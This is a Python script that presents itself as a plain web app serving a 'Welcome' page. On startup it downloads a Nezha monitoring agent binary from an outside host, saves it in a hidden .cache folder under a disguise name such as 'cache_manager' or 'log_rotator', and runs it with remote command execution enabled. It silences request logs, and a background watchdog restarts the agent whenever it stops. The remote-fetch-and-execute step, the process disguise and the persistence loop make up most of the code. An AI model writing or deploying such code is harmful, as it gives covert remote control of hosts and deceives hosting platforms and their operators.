import os
import time
import subprocess
import platform
import random
import sys
import traceback
from threading import Thread
from http.server import HTTPServer, SimpleHTTPRequestHandler

# Environment variables
FILE_PATH = os.environ.get('FILE_PATH', '.cache')
PORT = int(os.environ.get('PORT', 8080))
NEZHA_SERVER = os.environ.get('NEZHA_SERVER', '')
NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
NEZHA_KEY = os.environ.get('NEZHA_KEY', '')
UUID = os.environ.get('UUID', '14319740-39ed-4813-8817-f3b710598230')

DISGUISE_NAMES = ['cache_manager', 'session_handler', 'task_worker', 'log_rotator', 'health_check']

def get_random_name():
    return random.choice(DISGUISE_NAMES)

class QuietHTTPHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.serve_index()
        else:
            super().do_GET()

    def serve_index(self):
        index_path = 'index.html'
        if os.path.exists(index_path):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open(index_path, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            default_html = b'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: rgba(255,255,255,0.1);
            border-radius: 20px;
            backdrop-filter: blur(10px);
        }
        h1 { margin-bottom: 10px; }
        p { opacity: 0.8; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome</h1>
        <p>Application is running successfully.</p>
    </div>
</body>
</html>'''
            self.wfile.write(default_html)

def run_web_server():
    server = HTTPServer(('0.0.0.0', PORT), QuietHTTPHandler)
    server.serve_forever()

def create_directory():
    if not os.path.exists(FILE_PATH):
        os.makedirs(FILE_PATH)
        print(f"[INFO] Created directory: {FILE_PATH}")
    else:
        print(f"[INFO] Directory exists: {FILE_PATH}")

def get_system_architecture():
    architecture = platform.machine().lower()
    if 'arm' in architecture or 'aarch64' in architecture:
        return 'arm'
    else:
        return 'amd'

def download_file(file_name, file_url):
    file_path = os.path.join(FILE_PATH, file_name)
    print(f"[INFO] Downloading: {file_url}")
    print(f"[INFO] Save to: {file_path}")
    try:
        import requests
        response = requests.get(file_url, stream=True, timeout=60)
        response.raise_for_status()
        total = 0
        with open(file_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
                total += len(chunk)
        print(f"[INFO] Download complete, size: {total} bytes")
        return True
    except Exception as e:
        print(f"[ERROR] Download failed: {e}")
        traceback.print_exc()
        if os.path.exists(file_path):
            os.remove(file_path)
        return False

def get_download_url(architecture):
    if not NEZHA_SERVER or not NEZHA_KEY:
        return None
    if NEZHA_PORT:
        return "https://arm64.ssss.nyc.mn/agent" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/agent"
    else:
        return "https://arm64.ssss.nyc.mn/v1" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/v1"

def authorize_files(file_path):
    if os.path.exists(file_path):
        try:
            os.chmod(file_path, 0o775)
            print(f"[INFO] chmod 775 success: {file_path}")
        except Exception as e:
            print(f"[ERROR] chmod failed: {e}")

def exec_cmd(command):
    print(f"[INFO] Executing command...")
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        time.sleep(5)
        poll = process.poll()
        if poll is not None:
            stdout, stderr = process.communicate()
            print(f"[ERROR] Process exited immediately, code: {poll}")
            print(f"[ERROR] stdout: {stdout.decode(errors='ignore')[:500]}")
            print(f"[ERROR] stderr: {stderr.decode(errors='ignore')[:500]}")
            return False
        else:
            print(f"[INFO] Process running, PID: {process.pid}")
            return True
    except Exception as e:
        print(f"[ERROR] Exec failed: {e}")
        traceback.print_exc()
        return False

def run_agent():
    print("=" * 50)
    print("[INFO] === Nezha Agent Setup ===")
    print(f"[INFO] NEZHA_SERVER: {NEZHA_SERVER or 'EMPTY'}")
    print(f"[INFO] NEZHA_KEY: {'*' * min(len(NEZHA_KEY), 8) if NEZHA_KEY else 'EMPTY'}")
    print(f"[INFO] NEZHA_PORT: {NEZHA_PORT or 'EMPTY (v1 mode)'}")
    print(f"[INFO] UUID: {UUID}")
    print(f"[INFO] FILE_PATH: {FILE_PATH}")

    try:
        print(f"[INFO] Current UID: {os.getuid()}, GID: {os.getgid()}")
    except:
        pass

    try:
        print(f"[INFO] Current dir: {os.getcwd()}")
        print(f"[INFO] Dir writable: {os.access(os.getcwd(), os.W_OK)}")
        print(f"[INFO] PATH writable: {os.access(FILE_PATH, os.W_OK) if os.path.exists(FILE_PATH) else 'dir not exist'}")
    except:
        pass

    if not NEZHA_SERVER or not NEZHA_KEY:
        print("[ERROR] Missing NEZHA_SERVER or NEZHA_KEY, skipping agent")
        print("=" * 50)
        return

    architecture = get_system_architecture()
    print(f"[INFO] Architecture: {architecture} ({platform.machine()})")

    disguise_name = get_random_name()
    url = get_download_url(architecture)
    print(f"[INFO] Selected name: {disguise_name}")
    print(f"[INFO] Download URL: {url}")

    if not url:
        print("[ERROR] No download URL available")
        return

    if not download_file(disguise_name, url):
        print("[ERROR] Download failed, aborting")
        return

    agent_path = os.path.join(FILE_PATH, disguise_name)
    authorize_files(agent_path)

    # Verify file
    try:
        file_size = os.path.getsize(agent_path)
        print(f"[INFO] Agent file size: {file_size} bytes")
        if file_size < 1000:
            print(f"[ERROR] File too small, possibly not a valid binary")
            with open(agent_path, 'r', errors='ignore') as f:
                print(f"[ERROR] File content preview: {f.read(200)}")
            return
    except Exception as e:
        print(f"[ERROR] Cannot check file: {e}")

    # Test if binary can execute
    print("[INFO] Testing binary execution...")
    try:
        result = subprocess.run(
            [agent_path, '--help'],
            capture_output=True,
            timeout=10
        )
        print(f"[INFO] Test exit code: {result.returncode}")
        if result.stdout:
            print(f"[INFO] Test stdout: {result.stdout.decode(errors='ignore')[:200]}")
        if result.stderr:
            print(f"[INFO] Test stderr: {result.stderr.decode(errors='ignore')[:200]}")
    except PermissionError:
        print("[ERROR] PermissionError - cannot execute binary (noexec mount or permission denied)")
        print("[ERROR] This platform may not allow executing downloaded binaries")
        return
    except OSError as e:
        print(f"[ERROR] OSError: {e}")
        if 'Exec format error' in str(e):
            print("[ERROR] Wrong architecture binary")
        return
    except subprocess.TimeoutExpired:
        print("[INFO] Test timed out (may be OK if binary waits for input)")
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
        traceback.print_exc()
        return

    # Build command
    port = NEZHA_SERVER.split(":")[-1] if ":" in NEZHA_SERVER else ""
    tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']

    if NEZHA_PORT:
        nezha_tls_flag = '--tls' if NEZHA_PORT in tls_ports else ''
        command = f"{agent_path} -s {NEZHA_SERVER}:{NEZHA_PORT} -p {NEZHA_KEY} {nezha_tls_flag}"
        print(f"[INFO] Mode: Legacy (with port)")
        print(f"[INFO] TLS: {'yes' if nezha_tls_flag else 'no'}")
    else:
        nezha_tls = "true" if port in tls_ports else "false"
        config_yaml = f"""client_secret: {NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 4
server: {NEZHA_SERVER}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: {nezha_tls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: {UUID}"""

        config_path = os.path.join(FILE_PATH, 'config.yaml')
        try:
            with open(config_path, 'w') as f:
                f.write(config_yaml)
            print(f"[INFO] Config written to: {config_path}")
            print(f"[INFO] Mode: V1 (config file)")
            print(f"[INFO] TLS: {nezha_tls}")
        except Exception as e:
            print(f"[ERROR] Failed to write config: {e}")
            return

        command = f"{agent_path} -c \"{config_path}\""

    # Execute
    success = exec_cmd(command)

    if success:
        print("[INFO] Agent started successfully!")
    else:
        print("[ERROR] Agent failed to start")

    print("=" * 50)
    sys.stdout.flush()

def keep_alive():
    """Monitor agent and restart if needed"""
    while True:
        time.sleep(300)
        try:
            # Check if any agent process is running
            agent_running = False
            for name in DISGUISE_NAMES:
                agent_path = os.path.join(FILE_PATH, name)
                if os.path.exists(agent_path):
                    try:
                        result = subprocess.run(
                            ['pgrep', '-f', name],
                            capture_output=True,
                            timeout=5
                        )
                        if result.returncode == 0:
                            agent_running = True
                            break
                    except:
                        pass

            if not agent_running and NEZHA_SERVER and NEZHA_KEY:
                print("[WARN] Agent not running, attempting restart...")
                sys.stdout.flush()
                run_agent()
        except:
            pass

def main():
    print("[INFO] Application starting...")
    print(f"[INFO] Python version: {sys.version}")
    print(f"[INFO] Platform: {platform.platform()}")
    print(f"[INFO] Machine: {platform.machine()}")
    print(f"[INFO] PORT: {PORT}")
    sys.stdout.flush()

    create_directory()

    # Start agent
    try:
        run_agent()
    except Exception as e:
        print(f"[ERROR] Agent setup error: {e}")
        traceback.print_exc()

    # Start web server
    server_thread = Thread(target=run_web_server, daemon=True)
    server_thread.start()
    print(f"[INFO] Web server started on port {PORT}")

    # Start keep alive monitor
    if NEZHA_SERVER and NEZHA_KEY:
        monitor_thread = Thread(target=keep_alive, daemon=True)
        monitor_thread.start()
        print("[INFO] Agent monitor started")

    print("[INFO] Application ready")
    print(f" * Running on http://0.0.0.0:{PORT}")
    sys.stdout.flush()

    # Keep main thread alive
    while True:
        time.sleep(3600)

if __name__ == "__main__":
    main()
